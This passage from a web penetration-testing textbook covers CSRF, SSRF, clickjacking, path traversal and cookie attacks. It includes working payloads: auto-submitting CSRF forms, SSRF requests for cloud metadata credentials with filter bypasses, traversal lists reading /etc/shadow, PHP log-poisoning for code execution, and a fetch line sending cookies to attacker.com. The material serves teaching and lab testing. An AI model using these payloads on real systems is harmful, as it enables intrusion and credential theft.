+- DOM XSS in innerHTML sink using source location.search
+- DOM XSS in jQuery href attribute sink using location.search source
+- Reflected XSS into attribute with angle brackets HTML-encoded
+- Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+Each lab requires understanding the specific injection context and crafting the appropriate payload — exactly the skill real assessments require.
+
+---
+
+## 6.8 Understanding CSRF/XSRF and Server-Side Request Forgery
+
+### 6.8.1 Overview — CSRF and SSRF
+
+#### CSRF — Cross-Site Request Forgery: The Confused Deputy Attack
+
+CSRF (also written XSRF) is an attack where a malicious website tricks a victim's browser into making unintended requests to another site where the victim is authenticated. The browser helpfully includes the victim's session cookies with these requests — because that is what browsers do. The targeted application receives the request, sees a valid session cookie, and assumes it is a legitimate user action.
+
+The "confused deputy" analogy is perfect: the browser is the deputy (agent acting on the user's behalf). The attacker tricks the deputy into performing an action the user did not authorize. The deputy (browser) is confused because it has no way to tell whether the request originated from the legitimate application or from a malicious third-party site.
+
+**The fundamental enabler:** Browsers automatically attach cookies to every request made to a domain, regardless of which website triggered the request. If `evil.com` loads an image from `bank.com`, the browser sends the bank's cookies with that image request. This is the architectural behavior that CSRF exploits.
+
+#### The Classic CSRF Attack — Transferring Money Without Permission
+
+Alice is logged into her bank at `bank.com`. In another tab, she visits `attacker.com`. The malicious page contains:
+
+```html
+<!-- Invisible to Alice — loaded automatically when the page loads: -->
+<img src="https://bank.com/transfer?to=attacker_account&amount=5000" 
+     style="display:none" width="0" height="0">
+```
+
+When the browser loads this image, it makes a GET request to `bank.com` — with all of Alice's cookies attached. If the bank's transfer function accepts GET requests and does not validate CSRF tokens, the transfer completes. Alice loses $5,000 without clicking anything on the bank's website.
+
+For POST requests (which most modern applications require for state-changing operations), the attacker uses an auto-submitting form:
+
+```html
+<!-- This form submits automatically when the page loads: -->
+<form action="https://bank.com/transfer" method="POST" id="csrf-form">
+  <input type="hidden" name="to" value="attacker_account">
+  <input type="hidden" name="amount" value="5000">
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
+```
+
+The victim visits the attacker's page. The form auto-submits. The POST request goes to the bank with the victim's cookies. The transfer completes.
+
+#### Why CSRF and XSS Are Complementary Attacks
+
+XSS bypasses the Same-Origin Policy by executing code in the victim's origin context. CSRF exploits the fact that cross-site requests include cookies. Together they are often chained:
+
+1. Use XSS to extract the CSRF token from the page (JavaScript can read the DOM, including hidden CSRF token fields)
+2. Use the extracted CSRF token to forge a legitimate-looking request
+3. The CSRF protection is bypassed because the forged request includes a valid CSRF token
+
+This is why CSRF tokens alone are not sufficient if XSS is present. And why HttpOnly cookies alone are not sufficient if CSRF is present. Defense in depth requires both controls to work together.
+
+#### CSRF Token — The Primary Defense Mechanism
+
+CSRF tokens are random, unpredictable values embedded in forms and required in state-changing requests. A cross-origin attacker cannot read the page containing the token (Same-Origin Policy prevents reading cross-origin responses) and therefore cannot include the correct token in their forged request.
+
+**How CSRF tokens work:**
+1. Server generates a unique, random token per user session (or per request for higher security)
+2. Token is embedded in every form as a hidden field: `<input type="hidden" name="csrf_token" value="r4nd0m...">`
+3. Server validates the token on every state-changing request (POST, PUT, PATCH, DELETE)
+4. If token is missing or invalid, request is rejected
+
+**Common CSRF token implementation mistakes:**
+
+- **Storing the token client-side in accessible localStorage** → XSS can read it
+- **Using a predictable token** (sequential numbers, userID + timestamp) → guessable
+- **Not validating the token on all state-changing requests** → some endpoints unprotected
+- **Accepting the token in GET parameters** → Referer leakage exposes it
+- **Not expiring the token** → Stolen tokens remain valid indefinitely
+
+#### SameSite Cookies — The Modern CSRF Defense
+
+The `SameSite` cookie attribute (covered in 6.1.4) is now the primary CSRF defense in modern browsers. With `SameSite=Strict` or `SameSite=Lax`, browsers do not send cookies with cross-site requests, defeating CSRF at the browser level.
+
+However:
+- Legacy browsers do not support SameSite — 2024 browser stats show SameSite adoption at ~97% of browsers but legacy systems in corporate environments may be lower
+- `SameSite=Lax` protects against background cross-site requests but allows cookies on top-level GET navigations — if state-changing actions accept GET requests, CSRF is still possible
+- Subdomain-level trust: a cookie set for `.example.com` is still sent by cross-site requests from `other.example.com` — subdomain takeover can enable CSRF
+
+Best practice: implement both SameSite cookies AND CSRF tokens. Neither alone is perfect; together they provide defense in depth.
+
+#### SSRF — Server-Side Request Forgery: The Inside Man
+
+SSRF (Server-Side Request Forgery) is entirely different from CSRF despite the similar name. While CSRF tricks a user's browser into making requests, SSRF tricks the server itself into making requests to internal resources.
+
+SSRF occurs when an application fetches a URL or resource based on user-controlled input without proper validation. The application server — which has access to internal network resources that the external attacker cannot reach directly — makes the request on the attacker's behalf.
+
+**Why SSRF is critical in cloud environments:**
+
+Every major cloud provider runs an Instance Metadata Service (IMDS) at a well-known internal IP address:
+- **AWS:** `http://169.254.169.254/latest/meta-data/`
+- **Azure:** `http://169.254.169.254/metadata/instance`
+- **GCP:** `http://metadata.google.internal/computeMetadata/v1/`
+
+An EC2 instance can make HTTP requests. If an application on that instance has an SSRF vulnerability, the attacker can instruct the server to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, which returns the IAM role credentials. Those credentials give API access to AWS — potentially to S3 buckets, databases, secrets manager, and the entire cloud account.
+
+This is exactly how the 2019 Capital One breach occurred: an SSRF vulnerability in a web application firewall allowed an attacker to query the metadata service and obtain credentials, which were then used to download over 100 million customer records from S3.
+
+#### SSRF Attack Vectors and Bypass Techniques
+
+**Finding SSRF:**
+Any functionality that makes server-side HTTP requests based on user input:
+```
+- URL preview / link unfurling / "fetch this URL" features
+- Webhook configuration fields
+- Image/document import from URL
+- PDF generation from URL
+- Server-side health check features
+- OAuth redirect validation
+- XML imports (XXE can lead to SSRF)
+- File upload by URL
+```
+
+**Basic SSRF test payloads:**
+```
+http://169.254.169.254/latest/meta-data/       # AWS metadata
+http://169.254.169.254/latest/user-data/        # AWS user-data scripts (credentials often here)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Azure metadata (requires Metadata: true header in the request):
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# GCP metadata (requires Metadata-Flavor: Google header):
+http://metadata.google.internal/computeMetadata/v1/
+
+# Internal network scanning:
+http://10.0.0.1/
+http://192.168.1.1/
+http://172.16.0.1/
+http://127.0.0.1/admin
+http://localhost:6379/   (Redis)
+http://localhost:27017/  (MongoDB)
+http://localhost:9200/   (Elasticsearch)
+```
+
+**SSRF filter bypass techniques:**
+```
+# If IP 169.254.169.254 is blocked, try alternative representations:
+http://2852039166/             # Decimal representation of 169.254.169.254
+http://0xa9fea9fe/             # Hex representation
+http://0251.0376.0251.0376/    # Octal representation
+http://0xA9.0xFE.0xA9.0xFE/   # Mixed hex octets
+
+# IPv6 representations:
+http://[::ffff:169.254.169.254]/
+http://[::ffff:a9fe:a9fe]/
+
+# DNS rebinding — register a domain that resolves to internal IP:
+# Your domain: ssrf.attacker.com
+# DNS: initially returns attacker's server IP, then rebinds to 169.254.169.254
+# First request: allowed (external IP)
+# Second request: uses cached DNS → hits internal IP
+
+# Using redirects to bypass URL validation:
+# Your server returns: HTTP 302 Location: http://169.254.169.254/
+# Application follows redirect to the internal address
+
+# Protocol-based SSRF:
+file:///etc/passwd           # Local file read via file protocol
+dict://127.0.0.1:6379/info   # Interact with Redis via dict protocol
+gopher://127.0.0.1:25/...    # Send SMTP commands via gopher
+sftp://internal-server/      # SFTP protocol for internal access
+```
+
+**Blind SSRF — using Burp Collaborator to detect:**
+When SSRF does not reflect the response, use Burp Collaborator to detect the out-of-band request:
+```
+URL input: http://your-burp-collaborator-id.burpcollaborator.net/ssrf-test
+
+# If you receive an HTTP or DNS request in Collaborator:
+# The application made an outbound request — SSRF confirmed
+# Now test with internal targets
+```
+
+**SSRF Chaining — From SSRF to RCE:**
+SSRF is powerful alone (cloud credential theft), but can be chained:
+1. SSRF to Redis (`redis://localhost:6379`) → write to authorized_keys → SSH as root
+2. SSRF to Jenkins admin (`http://localhost:8080`) → execute Groovy script → RCE
+3. SSRF to Kubernetes API → list pods → get secrets → escalate
+4. SSRF to internal admin panel → bypass authentication (accessible only from localhost)
+
+---
+
+### 6.8.2 Practice — CSRF and SSRF Attacks
+
+#### Building a CSRF Proof of Concept
+
+The most convincing CSRF demonstration in an assessment creates a working proof-of-concept HTML page that performs the unauthorized action when visited.
+
+**Step 1: Capture the legitimate request**
+In Burp Suite, perform the legitimate state-changing action (changing email, changing password, initiating transfer). Find the request in Burp HTTP History.
+
+**Step 2: Check for CSRF tokens**
+Examine the request for CSRF tokens or custom headers. If present, test whether they are actually validated:
+- Remove the token entirely → does the request succeed? (Token not validated)
+- Send an incorrect token → does the request succeed? (Token not validated)
+- Use an old expired token → does the request succeed? (Token not expiring)
+- Change the token by one character → does the request succeed? (Token not securely validated)
+
+**Step 3: Generate the CSRF PoC with Burp**
+Right-click the request in Burp → "Engagement tools" → "Generate CSRF PoC"
+
+Burp automatically generates an HTML page that submits the forged request. Customize it if needed.
+
+**Step 4: Test the PoC**
+Open the generated HTML in a browser where you are logged into the target application. The action should complete automatically, confirming CSRF.
+
+**Example manual CSRF PoC for an email change:**
+```html
+<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC</title></head>
+<body onload="document.csrf.submit()">
+  <form name="csrf" action="https://target.com/account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@attacker.com">
+    <!-- No CSRF token needed if the endpoint doesn't validate it -->
+  </form>
+  <p>Loading...</p>
+</body>
+</html>
+```
+
+#### Testing SSRF on DVWA
+
+DVWA does not have a dedicated SSRF module, but SSRF can be practiced using the file inclusion modules with file:// protocol, or using purpose-built SSRF-vulnerable Docker containers:
+
+```bash
+# SSRF test environment:
+docker run -d -p 5000:5000 vulnerables/ssrf-test
+
+# Or use SSRFire:
+docker run -d -p 8888:8888 trufflesecurity/ssrfmap-demo
+```
+
+For real SSRF practice, PortSwigger Web Security Academy provides excellent guided SSRF labs covering basic SSRF, blind SSRF with Burp Collaborator, and filter bypass techniques.
+
+---
+
+## 6.9 Understanding Clickjacking
+
+### The Concept — Stealing Clicks Through Invisible Layers
+
+Clickjacking, also called UI Redress Attack, is an attack where a malicious page overlays an invisible (or transparent) iframe containing a legitimate target site on top of a fake, harmless-looking page. When the victim clicks on what they think is a button on the attacker's page, they are actually clicking on an element in the invisible target site.
+
+The victim thinks they are clicking "Click here to win a prize" on `attacker.com`. They are actually clicking "Confirm fund transfer" on their bank's invisible overlay. They see the attacker's page. Their click is delivered to the bank's frame.
+
+**The iframe magic:**
+
+```html
+<!-- Clickjacking attack page: -->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  /* The target site frame is invisible and positioned exactly over the fake button: */
+  iframe {
+    width: 500px;
+    height: 700px;
+    position: absolute;
+    top: 0;
+    left: 0;
+    opacity: 0.0001;   /* Effectively invisible to the user */
+    z-index: 2;        /* On top of everything — receives the clicks */
+  }
+  
+  /* The fake button the user thinks they are clicking: */
+  .fake-button {
+    position: absolute;
+    top: 200px;        /* Aligned to sit under the real "Confirm" button in the iframe */
+    left: 150px;
+    background: #ff6600;
+    color: white;
+    padding: 15px 30px;
+    font-size: 18px;
+    z-index: 1;        /* Below the iframe — not actually receiving clicks */
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+  <!-- The malicious invisible overlay — the bank's transfer confirmation: -->
+  <iframe src="https://victim-bank.com/transfer/confirm?to=attacker&amount=5000">
+  </iframe>
+  
+  <!-- The decoy button the user sees: -->
+  <div class="fake-button">Click here to claim your prize!</div>
+  
+</body>
+</html>
+```
+
+When the victim clicks the orange "Click here to claim your prize!" button, the click passes through the transparent iframe and clicks on the bank's "Confirm Transfer" button positioned at the same location. The transfer completes. The victim is confused about why nothing happened on the "prize" page.
+
+#### Clickjacking Variants
+
+**Multi-click Clickjacking:**
+The attacker constructs a sequence of steps that requires multiple clicks — each aligned with a different action in the iframe. First click on a confirmation dialog. Second click on "Are you sure?" Third click on the final confirm. The victim thinks they are playing a clicking game or solving a CAPTCHA.
+
+**Drag-and-Drop Clickjacking:**
+Instead of clicks, exploit drag-and-drop interactions. Overlay an invisible file upload form over a game where the user drags a game piece — they are actually dragging a file into the upload field.
+
+**Keystroke Jacking:**
+Overlay a text input field over the victim's apparent input area. Keystrokes they think they are typing into the game's search box are actually going into a hidden authentication form.
+
+**Likejacking:**
+Making victims unknowingly "Like" a Facebook page or share content by overlaying the social button over an attractive interface element.
+
+#### Detecting Clickjacking Vulnerability
+
+Testing is straightforward: if a page can be loaded in an iframe, it is potentially vulnerable to Clickjacking.
+
+```html
+<!-- Simple test page — save as clickjack_test.html: -->
+<html>
+<body>
+<iframe src="https://target.com/sensitive-action" width="1000" height="800">
+</iframe>
+</body>
+</html>
+
+<!-- Open this in a browser. If the target page loads in the iframe:
+     → X-Frame-Options header is missing or misconfigured
+     → CSP frame-ancestors directive is missing
+     → Clickjacking is possible -->
+```
+
+**Using Burp Suite:**
+In any HTTP response, check for:
+- `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` — protects against framing
+- `Content-Security-Policy: frame-ancestors 'none'` — the modern equivalent, more flexible
+
+If neither is present: Clickjacking vulnerability. Create the iframe test HTML to confirm.
+
+**Nuclei check:**
+```bash
+nuclei -u https://target.com -id clickjacking
+nuclei -u https://target.com -tags clickjacking
+```
+
+#### Which Pages Matter
+
+Not all pages are interesting Clickjacking targets. The vulnerability is only impactful when:
+- The target page performs a state-changing action on a single click (confirm transfer, delete account, change email, approve request)
+- The target page is accessible when the victim is authenticated (so their session carries the action through)
+
+A login page protected by Clickjacking is lower severity — the attacker can get credentials through better means. An admin panel "Delete User" button or "Approve Administrator" action that can be triggered via Clickjacking is critical.
+
+#### Frame Busting — The Old (Bypassable) Defense
+
+Before HTTP headers provided server-side protection, developers used JavaScript "frame busters" — code that checked whether the page was in a frame and broke out if so:
+
+```javascript
+// Frame buster JavaScript (historically used, now considered insufficient):
+if (top !== self) {
+  top.location = self.location;  // Force navigation to this URL
+}
+// Or: if (top.location !== self.location) top.location = self.location;
+```
+
+These were bypassable via `sandbox` attribute on the iframe:
+
+```html
+<!-- sandbox prevents the frame buster from running via the top.location access: -->
+<iframe sandbox="allow-forms allow-scripts" src="https://target.com">
+```
+
+The `sandbox` attribute removes the framed page's ability to access `top.location`, neutering the frame buster while still allowing forms and scripts to execute. This is why JavaScript frame busters are not an acceptable defense.
+
+#### Clickjacking Defenses
+
+**Defense 1 — X-Frame-Options header (legacy but widely supported):**
+```
+X-Frame-Options: DENY              # Page cannot be framed by anyone
+X-Frame-Options: SAMEORIGIN       # Page can only be framed by pages on the same origin
+X-Frame-Options: ALLOW-FROM https://trusted.com  # Only this specific origin (deprecated)
+```
+
+**Defense 2 — CSP frame-ancestors directive (modern, more flexible):**
+```
+Content-Security-Policy: frame-ancestors 'none';      # Same as DENY
+Content-Security-Policy: frame-ancestors 'self';      # Same as SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;  # Multiple
+```
+
+CSP `frame-ancestors` overrides `X-Frame-Options` in modern browsers. Both should be set for compatibility with older browsers. Note: CSP `frame-ancestors` cannot be set via meta tags — it must be in the HTTP header.
+
+---
+
+## 6.10 Exploiting Security Misconfigurations
+
+### 6.10.1 Overview
+
+Security misconfiguration is the broadest and in many ways the most common vulnerability category in real-world assessments. It encompasses every situation where a system is technically capable of being secure but has been deployed, configured, or maintained in an insecure state.
+
+The OWASP Top 10:2021 lists Security Misconfiguration as A05 — the fifth most prevalent category. But in practice, it overlaps with nearly every other category: a missing CSRF token is a misconfiguration. A weak CSP is a misconfiguration. Default credentials are a misconfiguration. Missing security headers are misconfigurations.
+
+This section specifically covers two subcategories that deserve detailed treatment: directory traversal (a failure in file system access control) and cookie manipulation (exploiting improperly secured state management).
+
+---
+
+### 6.10.2 Directory Traversal Vulnerabilities
+
+#### The Concept — Reading Files Outside the Intended Directory
+
+Directory traversal (also called path traversal or dot-dot-slash attack) occurs when an application uses user-controlled input to construct file system paths and does not properly restrict the path to an intended directory. The attacker uses relative path sequences (`../`) to "traverse" out of the intended directory and into the broader file system.
+
+Consider an application that serves product images:
+```
+https://shop.com/images?file=product1.jpg
+```
+
+The server code:
+```php
+// VULNERABLE PHP code:
+$file = $_GET['file'];
+$path = '/var/www/html/images/' . $file;
+echo file_get_contents($path);
+```
+
+When `file=product1.jpg`, the path becomes `/var/www/html/images/product1.jpg` — correct.
+
+When `file=../../../etc/passwd`, the path becomes:
+```
+/var/www/html/images/../../../etc/passwd
+→ Simplified: /etc/passwd
+```
+
+The `../` sequences traverse up the directory tree, out of `/var/www/html/images/`, out of `/var/www/html/`, out of `/var/www/`, and into `/etc/`, allowing reading of `/etc/passwd` — a file listing all user accounts on the Linux system.
+
+#### What Files to Target — High-Value Path Traversal Targets
+
+**Linux / Unix systems:**
+
+| File | What It Reveals |
+|------|----------------|
+| `/etc/passwd` | User accounts (historically had passwords, now references /etc/shadow) |
+| `/etc/shadow` | Password hashes for all user accounts (requires root) |
+| `/etc/hosts` | Internal hostname-to-IP mappings (reveals internal network structure) |
+| `/etc/hostname` | System hostname |
+| `/proc/version` | Linux kernel version and distribution |
+| `/proc/net/tcp` | Active TCP connections (reveals internal services) |
+| `/proc/self/environ` | Environment variables for the web server process (may contain secrets) |
+| `/proc/self/cmdline` | Command line used to start the web server process |
+| `/var/log/apache2/access.log` | Apache access logs |
+| `/var/log/nginx/access.log` | Nginx access logs |
+| `/var/log/auth.log` | Authentication logs |
+| `~/.ssh/id_rsa` | Private SSH key (if web server runs as a non-root user with keys) |
+| `/home/user/.bash_history` | Command history revealing sensitive commands |
+| `/etc/crontab` | Scheduled tasks (reveals automation and privileged scripts) |
+| Application config files | `/var/www/html/config.php`, `../settings.py`, `../config.yml` |
+
+**Windows systems:**
+
+| File | What It Reveals |
+|------|----------------|
+| `C:\Windows\System32\drivers\etc\hosts` | Hosts file |
+| `C:\Windows\win.ini` | Legacy Windows initialization file |
+| `C:\inetpub\logs\LogFiles\` | IIS access logs |
+| `C:\Users\[user]\Desktop\` | User's desktop (sometimes configuration files) |
+| `C:\xampp\apache\conf\httpd.conf` | XAMPP Apache config |
+| `C:\ProgramData\` | Application data directory |
+| `C:\Windows\System32\config\SAM` | Windows password hashes (locked while OS running) |
+
+**Web application configuration files (most impactful):**
+
+```
+# PHP applications:
+../config.php
+../config/database.php
+../../.env                    # Laravel, Node.js: contains DB passwords, API keys
+../wp-config.php              # WordPress database credentials
+../configuration.php          # Joomla database credentials
+
+# Python/Django:
+../../settings.py
+../settings/production.py
+
+# Java:
+../../WEB-INF/web.xml         # Servlet configuration
+../../WEB-INF/classes/application.properties  # Spring Boot config
+../../../META-INF/context.xml
+
+# Node.js:
+../../.env
+../../config/config.json
+../../package.json           # Reveals dependencies and scripts
+
+# General:
+../../.git/config            # Git configuration (may reveal remote repo URLs/credentials)
+../../.git/HEAD
+../../.htpasswd              # HTTP Basic Auth credentials
+../../.htaccess              # Apache access control configuration
+```
+
+#### Detection Payloads — Systematic Testing
+
+```
+# Basic traversal (Linux):
+../../../etc/passwd
+
+# Basic traversal (Windows):
+..\..\..\Windows\win.ini
+..\..\..\Windows\System32\drivers\etc\hosts
+
+# URL-encoded variants (bypasses simple string matching):
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd        # URL encoding
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2fetc%2fpasswd                     # Mixed encoding
+%252e%252e%252fetc%252fpasswd                   # Double URL encoding
+
+# Unicode/UTF-8 encoding:
+..%c0%af../etc/passwd                           # Overlong UTF-8 encoding
+..%ef%bc%8f../etc/passwd
+
+# Null byte (for older PHP/Perl apps with file extension stripping):
+../../../etc/passwd%00.jpg
+# PHP pre-5.3.4 would truncate at %00, ignoring the .jpg extension
+
+# Path truncation (older PHP versions):
+# Very long paths may cause PHP to truncate to the expected directory
+
+# Windows-specific:
+..\..\..\..\Windows\win.ini
+../../../../../../Windows/win.ini
+....//....//....//etc/passwd                    # Double-dot slash bypass
+
+# Using absolute paths (if server allows):
+/etc/passwd
+C:\Windows\win.ini
+```
+
+#### Using Burp Suite for Systematic Path Traversal Testing
+
+```
+1. Identify every parameter that seems to reference a filename:
+   ?file=, ?page=, ?doc=, ?image=, ?template=, ?module=, ?path=
+
+2. For each parameter, send to Burp Intruder:
+   - Payload position: the filename value
+   - Payload list: path traversal wordlist from SecLists:
+     /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+     /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
+
+3. Look for:
+   - Responses containing "root:x:0:0:" (Linux /etc/passwd content)
+   - Responses containing "[extensions]" (Windows win.ini content)
+   - Responses with unusual size differences from baseline
+   - Error messages that reveal file system paths
+
+4. Confirm with a simple payload first:
+   Start with ../../../etc/passwd
+   If that fails, try URL-encoded variants
+   If those fail, try double encoding
+```
+
+#### Common Bypasses for Path Traversal Filters
+
+**Filter: strips `../` sequences**
+```
+# Replace ../ with ....// (double encoding trick):
+....//....//....//etc/passwd
+→ After stripping ../:  ../../etc/passwd (still traverses)
+```
+
+**Filter: blocks known paths like `/etc/passwd`**
+```
+# Case variation (Windows case-insensitive):
+..\..\..\WINDOWS\win.ini
+
+# Null bytes:
+/etc/passwd%00
+
+# Additional path segments:
+/etc/./passwd
+/etc//passwd
+/etc/passwd/
+```
+
+**Filter: enforces extension (e.g., only allows .jpg, .png)**
+```
+# Null byte (PHP < 5.3.4):
+../../../etc/passwd%00.jpg
+
+# Path truncation with very long string:
+/safe/path/../../../../../etc/passwd/[4096 characters of padding].jpg
+```
+
+#### Path Traversal to LFI to RCE
+
+In PHP applications, path traversal often escalates to Local File Inclusion (LFI), which can chain to Remote Code Execution:
+
+**LFI via Log Poisoning:**
+1. Apache access logs (`/var/log/apache2/access.log`) contain the User-Agent string
+2. Send a request with a PHP payload as the User-Agent: `User-Agent: <?php system($_GET['cmd']); ?>`
+3. PHP code is now stored in the log file
+4. Use LFI to include the log file: `?page=../../../var/log/apache2/access.log`
+5. The PHP code in the log executes: `?page=...access.log&cmd=id`
+
+**LFI via /proc/self/environ:**
+The environment of the web server process (containing the User-Agent) may be accessible via `/proc/self/environ`:
+1. Set User-Agent to PHP payload
+2. Include `/proc/self/environ` via LFI
+3. PHP executes
+
+**LFI via PHP session files:**
+PHP session files are stored in `/tmp/sess_[sessionid]`. If you can inject PHP code into your session data and then include the session file via LFI, you achieve code execution.
+
+---
+
+### 6.10.3 Practice — Directory Traversal
+
+#### Testing on DVWA — File Inclusion Module
+
+DVWA's File Inclusion module is the best starting point. At Low security, the page parameter includes files directly:
+
+```
+# View the URL:
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php
+
+# Basic path traversal to read /etc/passwd:
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd
+
+# On Windows DVWA:
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\Windows\win.ini
+
+# Read DVWA's configuration file (reveals MySQL credentials):
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../config/config.inc.php
+
+# At Medium security (filter strips ../ once):
+# Use double traversal: ....//....//....//etc/passwd
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
+
+# At High security:
+# Only allows files starting with "file" — bypass with:
+# file:///etc/passwd (file protocol for local file access)
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///etc/passwd
+```
+
+#### Using Cadaver and dirb for Web Server File Enumeration
+
+```bash
+# ffuf for path traversal fuzzing:
+ffuf -u "http://target.com/page?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -fw 10          # Filter by word count baseline
+  -mc 200         # Only show 200 OK responses
+
+# dotdotpwn — dedicated path traversal fuzzer:
+dotdotpwn -m http -h target.com -u "http://target.com/page?file=TRAVERSAL" \
+  -f /etc/passwd -d 8 -o unix
+
+# For confirmed traversal, systematically read high-value files:
+for file in "/etc/passwd" "/etc/shadow" "/etc/hosts" "/proc/version" "/proc/self/environ"; do
+  echo "=== $file ===";
+  curl -s "http://target.com/page?file=$(python3 -c "print('../'*8)")${file}" 2>/dev/null;
+done
+```
+
+---
+
+### 6.10.4 Cookie Manipulation Attacks
+
+#### Understanding Cookie Architecture for Attack
+
+Cookies are the state management layer sitting on top of stateless HTTP. They are key-value pairs stored in the browser and sent to the server on every matching request. For web application security, cookies serve three main functions: session management (the session ID that proves authentication), user preferences (language, theme), and tracking (analytics identifiers).
+
+From an attacker's perspective, cookies are interesting because:
+1. They carry authentication proof — steal or forge them to impersonate users
+2. They carry state that the server trusts — modify them to manipulate server-side logic
+3. They can contain encoded data that the server processes — modify the encoding to change behavior
+4. They can carry JWTs — forge the token to claim different identity or privileges
+
+#### Attack 1 — Cookie Value Manipulation
+
+Applications sometimes store sensitive state in cookies and make server-side decisions based on those values, trusting that users cannot or will not modify them. This trust is misplaced — users have full control over their own cookies.
+
+**Examples of vulnerable cookie patterns:**
+
+```
+# Role stored in cookie (critical vulnerability):
+Cookie: role=user
+
+# Simply change to:
+Cookie: role=admin
+# If the server reads the role from the cookie without server-side validation:
+# Full admin access
+
+# Account ID in cookie:
+Cookie: user_id=1042
+# Change to:
+Cookie: user_id=1   # Often the first admin account
+
+# Boolean flags:
+Cookie: is_premium=false
+# Change to:
+Cookie: is_premium=true
+# Premium features unlocked
+
+# Email address (determines which account is shown):
+Cookie: account=alice@example.com
+# Change to:
+Cookie: account=admin@example.com
+# Or another user's email
+```
+
+**How to test:**
+In Burp Suite, intercept any request and examine all cookie values. For each cookie value that looks like it could be role-related, user-identifying, or feature-flagging:
+1. Modify the value to something more privileged
+2. Forward the modified request
+3. Observe whether the response is different
+
+This can also be done with the browser's DevTools (Application → Cookies → double-click to edit), or with the Cookie Editor browser extension.
+
+#### Attack 2 — Cookie Decoding and Re-encoding
+
+Application cookies are often encoded (Base64, URL encoding) but not encrypted or signed. Decoding them reveals the underlying data structure, which can be modified and re-encoded.
+
+```bash
+# Base64 decode a suspicious cookie:
+echo "dXNlcjoxMDQy" | base64 -d
+# Output: user:1042
+
+# Modify the decoded value:
+# user:1 (first user, likely admin)
+
+# Re-encode:
+echo -n "user:1" | base64
+# Output: dXNlcjox
+
+# Use modified cookie in request:
+Cookie: auth=dXNlcjox
+
+# If no signature verification, server uses this value and gives admin access
+```
+
+**Recognizing common encoded patterns:**
+
+```
+# Base64 pattern: letters, numbers, +, /, = padding
+YWRtaW4=         → "admin"
+dXNlcjoxMDQy     → "user:1042"
+eyJhbGci...      → JWT (three base64 segments separated by dots)
+
+# URL-encoded JSON:
+%7B%22user%22%3A%22alice%22%2C%22role%22%3A%22user%22%7D
+→ Decoded: {"user":"alice","role":"user"}
+
+# Serialize formats (PHP, Python pickle, Java):
+O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}
+→ PHP serialized object (deserialization vulnerability if untrusted)
+```
+
+#### Attack 3 — JWT Manipulation in Cookies
+
+Many modern applications store JWTs in cookies rather than localStorage (for HttpOnly protection). When you find a cookie containing a value that starts with `eyJ` (Base64 for `{"`) followed by a dot, you have a JWT.
+
+JWT-specific attacks in cookie context:
+
+```bash
+# Decode the JWT (without verifying signature):
+# Install jwt_tool:
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool && pip3 install -r requirements.txt
+
+# Decode and display:
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQyIiwicm9sZSI6InVzZXIifQ.xxx
+
+# Test alg:none attack:
+python3 jwt_tool.py eyJ... -X a
+
+# Test HS256 brute force (weak secret):
+python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt
+
+# Modify claims and re-sign with known secret:
+python3 jwt_tool.py eyJ... -T -S hs256 -p "secret"
+# Modify: change role from user to admin in the interactive editor
+# jwt_tool creates a new token signed with the provided secret
+```
+
+#### Attack 4 — Cookie Scope Exploitation
+
+The `Domain` and `Path` attributes of cookies determine where they are sent. Misconfigurations in these attributes can create security issues:
+
+**Overly broad Domain scope:**
+A cookie set with `Domain=.example.com` is sent to all subdomains. If any subdomain has an XSS vulnerability, an attacker exploiting XSS on `vulnerable.example.com` can access cookies scoped to `.example.com` — including the session cookie for `app.example.com`.
+
+**Testing Domain scope:**
+```javascript
+// XSS payload on vulnerable.example.com:
+// Try to read cookies from parent domain:
+document.cookie      // Shows cookies available at current domain including .example.com scope
+fetch('https://attacker.com/steal?c=' + document.cookie);
+```
+
+**Path scope confusion:**
+A cookie with `Path=/api` is only sent to requests under `/api`. If sensitive operations also occur at `/v2/api`, and the session cookie is scoped to `/api` only, the `/v2/api` requests have no session — potentially creating authentication bypass if the server incorrectly treats cookieless requests as authenticated.
+
+#### Attack 5 — Cookie Smuggling via Header Injection
+
+If user-controlled input is used in setting a cookie (e.g., the application sets a cookie containing the user's username), and if special characters are not filtered, an attacker may inject additional headers or cookie directives through CRLF injection:
+
+```
+# If username is reflected in Set-Cookie header:
+# Normal: Set-Cookie: username=alice; HttpOnly; Secure
+# 
+# Attacker registers username: alice\r\nSet-Cookie: admin=true
+# Resulting headers (if not sanitized):
+Set-Cookie: username=alice
+Set-Cookie: admin=true
+```
+
+The server injects an additional `Set-Cookie` header controlled by the attacker. This is a header injection / CRLF injection vulnerability that uses cookies as the target.
+
+**Testing:**
+In any username, display name, or profile field that might end up in HTTP response headers, inject CRLF characters:
+```
+Test input: alice%0d%0aSet-Cookie:%20admin%3Dtrue
+```
+Examine the response headers for injected headers.
+
+#### Comprehensive Cookie Testing Checklist
+
+```
+During every web application assessment:
+
+□ Capture Set-Cookie headers from all responses
+□ For each cookie:
